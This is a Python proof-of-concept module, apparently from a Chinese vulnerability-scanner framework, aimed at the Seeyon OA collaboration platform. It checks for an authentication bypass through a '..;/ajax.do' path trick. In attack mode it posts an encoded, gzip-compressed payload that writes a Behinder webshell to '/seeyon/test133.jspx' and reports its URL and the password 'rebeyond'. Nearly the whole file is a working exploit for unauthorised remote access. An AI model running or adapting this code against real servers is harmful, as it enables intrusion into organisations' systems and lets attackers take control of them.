# -*- coding: utf-8 -*-

from poc import core

def check(url,attack):
	name='ajax.do登录绕过&任意文件上传'
	path='/seeyon/thirdpartyController.do.css/..;/ajax.do'
	core.start_echo(name)
	r=core.get(url,path)
	if r:
		if 'java.lang.NullPointerException:null' in r.text:
			if attack:
				get_shell(name,url)
			else:
				core.end_echo(name,url+path)
				core.result('可能存在'+name,url+path)
		else:
			core.end_echo(name)
	else:
		core.end_echo(name)

def get_shell(name,url):
	print('\033[32m[#]开始写入webshell\033[0m')
	path='/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip'
	header={
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
	"Content-Type": "application/x-www-form-urlencoded",
	}
	data="managerMethod=validate&arguments=%1F%C2%8B%08%00%00%00%00%00%00%03uTY%C2%93%C2%A2H%10%7E%C3%9E%C3%BD%15%C2%84%2F%C3%9A%C3%9136%C2%82%C2%8C%C3%ADN%C3%ACC%7B%21%C2%A2%C2%A8%C2%A0%5C%1B%C3%BB%00U%C3%88a%15%C2%B0rH%C3%991%C3%BF%7D%0B%C2%B0%C2%A7%7Bb%7B%C3%AB%C2%A52%C2%B32%C2%BF%C3%8A%C3%BB%C2%AF%C3%97%C3%AE%29%C2%B9%C3%A0%029%07%C2%92z%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%B8%C2%96ts%2F%C3%8B%C2%BB%C3%AF%C3%A2y%C2%95%5E%C2%BC%2C%0B%C2%93%C2%B8%7E%C3%94%C3%B2K%18%C3%BBL%C3%AA%C3%A4%01%C3%B3%27%C3%93%C3%A9%C3%B7%C2%9F%C2%AE%C2%9E%C3%AB%C2%A4i%C3%B6%C2%94y%1EI%C3%A2%C2%A7%C3%8E%C3%B7%C3%9F%C2%99%C3%B6%C3%BC%169%C2%A5%C3%93%0F%C2%93%C3%BE%C2%8E%C2%9A%C3%A4%C3%86%25%C3%8C%C2%BD%0B%C2%93%C2%BE%C3%93%1C%05%C2%88%C2%BD%2B%C3%B3%C2%89Z%C2%AF%C3%86%7F%C3%AC%C3%94%C2%9E%0Cx%C2%BE%1Fei%C3%95y%C3%B8%09%C3%8C%C3%9C%C2%9D%C3%88%02%0F%C2%A1%C3%9A%C2%8B%C2%9D%C2%98%C3%9E%C3%80%2C%25.7f%C2%A5e%C2%90%C2%BB%C2%A2p%C3%9B%C3%A2Z%C3%86%C2%86%C3%8ERe%C3%81%2C%29%C3%97%5C%1A%40%3C%2F%00%C2%AF%17k%C2%AC%C2%94%C2%AE6%C2%96%C2%8F%C2%83%C2%97%C3%B2%28.b%5B%C2%93%7C%C2%88u%028T%C2%BA%11%1Bn%C2%B4%21%C2%91%C2%A2%C3%A1%C2%B3%13%2B%C3%97-VS%C2%80%C3%B5%08%C2%8A%C2%88%C2%B35%C3%A1j%19%10I%22%C3%8A%C2%818%26%C2%B0%C3%86%C3%87%0B%C3%8E%C3%92%C2%84%01%7D%C3%8F%C3%96a%C2%925%C2%BC%C3%A9%17%16%C2%BF%12%C3%80R-%3F%C2%95Q%5C%C3%9B%C3%98%14r%28%C2%95%C2%BB%C2%A8%C3%BA%07%C3%B0%2F%C3%9FlQ%C2%8F%5CqA%2CSM%5Dn%C3%B8%28%C2%89Jf%C2%99%C3%8AMZ%1C%7D%C3%9B%0CX%C3%9B%10%C3%8E%C2%80LfT%C3%A7%06%C3%98%C2%AA%C2%B4%0C%15%C2%818%C3%97%C3%A5y%C2%ABw%10%C3%87%01%C3%85+%C2%92%C2%B8I%3D%5E%19%00J%C3%8B%C2%94%C3%9E%C3%B2%C2%83%2B4V%C2%99cl%C3%BC%3DW%05%C2%80%C3%9F%C3%B86%09B%C3%8FT%C2%91%C2%B4%C3%88%C2%A1%15%C2%A2%11%C2%8D%C2%8F%C2%85%C3%A6%C2%AA%C2%90%C2%96%C2%AD%C3%9D%1A%C2%AB%C3%88%C3%86%C2%A8%C2%B0%C2%8F-%C2%B6%2CJ%C3%99fZ%C2%85k%5C%21%17C%C3%96%C2%99%C2%9EG%27%C2%93%7D%C2%A69%C2%AD%C3%B3%7E%C2%B6%C2%8DZo%15%C3%90%1C%C3%90%C3%BC%C3%9D%C3%B3%16%2B%11%C3%80%C3%A8%0A%C3%85%0A%C3%81%C2%99p%C2%80%C3%8BU%C3%AAb%C3%A0%3B76%C2%B4%0F%C3%BB%C2%81%7D%C3%98%C2%90%C2%ADa%23%2B%C3%92%C3%8F%C3%9B%C2%834%C2%B0Bi%048%C3%BD%C3%96%C3%94+%14%C2%AE%C3%90T%0D%C3%8B%C2%A8%06%C2%B6%C3%A6%C2%87P%C2%932%C2%87%C2%9CG%7B%0E%5D%C2%9D6%C3%86%C3%B1%1B%C2%BD%C3%86%10%C3%819%C2%A2uU%03%17%2BH%C2%9E%C2%AE%26%C2%AA%C2%BE%09%C3%A5C%1E%C2%ADi%0C%C2%8E%C2%B9O6aU%C3%98%26%C3%B0%C2%8F%C2%9C%1E%C3%95%C2%B1j%C2%9C.%1C%C3%B9%09%C2%B2%C2%88%C2%9F%7C%C3%B83%C2%B6%7F%C3%BD3%C2%95%C2%89%14%C3%8AZ%23%C2%9F%C3%96%C3%B9%02%C3%84O%C3%97o%C3%B8%C3%9Ay%C3%A4b%C2%9D%C2%A7%C3%B5I%C2%A0%18%C2%A4%C2%804zm%7Dj%C2%BD%C3%86%C2%AF_k%23O%C3%8FT%0E%12%C2%8B%08g%C2%97%C2%B5i%3E%16%C2%99%2C%0A%08%C2%92%C3%89%0D%1A%C3%83%C3%825%C3%90%C2%8D%C2%BEM%C3%B7%C2%BA%C2%B2P%22uN%C3%B3Z%C3%9E%C3%AD%C2%8A%C2%A6%3F8%15%C3%ADc%1D%C3%9B%C2%B4W%C3%A5%C3%A5%0A%01SG%C2%80%C3%9F%176%C2%A7%C2%B3G%C2%AC%C2%BF%C3%BDQ%C2%80%C2%9A%C2%A6s%C3%AB%C3%A2cB%C3%BDLi%0C4%7E%C2%B8rc%C2%85%C2%B5%0C%21%C2%A2%C3%B1Q%3F%C3%B4%0A%1A%C2%8B%0C%C2%90%C2%A0%C3%A9%C3%A9%3D7.%C2%A0%C2%A8%0F%21%C2%AD%C3%ADn%3Anz%12p%0Aq%C3%8C%09%C3%AB%C2%8A%3A%C2%BB%C2%8B%C2%AEe%5B%C3%97U%C3%A9%C3%B2%C3%BB%C3%87%C3%B79g%C2%B2%22%C3%AE%C3%A30%03%C3%BD%C3%89%C2%8B6%C3%BF6%C2%9Cy+%C2%81t%C3%94%C3%A1%C3%BDn%C2%A7%C3%BCs%C2%A5%C3%9E%7F%C2%A7%C2%BA5%C2%BB3%C2%ADm%C3%8B%C3%B4%C3%AE%C2%80%C3%BD%C3%B6%C2%9E%14%C2%A7%13%05h%C2%96%C3%80%C3%83%C2%97%C3%8E%C3%B1%C2%B0%C3%B8%C3%BA%C3%BCqI%7C%C3%9C4%C3%BD%C2%86Aq%C3%AF%23%C3%B8%C3%BF%C3%A9%02%C2%94d%1Eu%C3%AC%C3%87%C3%B7z%C3%BFP%02z%27%26%C3%8B%C2%9D%3C%04LUU%C2%BD%C2%87%C3%97%C3%AE%0F%C2%BA%1E%C3%A9%C2%8A%7C%C2%AD%C3%AF%C3%BCRx%C3%9D%C2%BF%C3%BF%05%C3%8E%C3%96%C2%AC%C2%8FY%05%00%00"
	r=core.post(url,path,header,data)
	if r.status_code==500 and '"message":null' in r.text:
		print('\033[32m[#]成功写入webshell\033[0m')
		core.end_echo(name,'webshell地址：'+url+'/seeyon/test133.jspx'+'\n'+'\033[32m[#]冰蝎密码：rebeyond\033[0m')
		core.result(name,url+'/seeyon/test133.jspx','rebeyond')

	else:
		print('\033[32m[#]写入webshell失败\033[0m')
		core.end_echo(name)
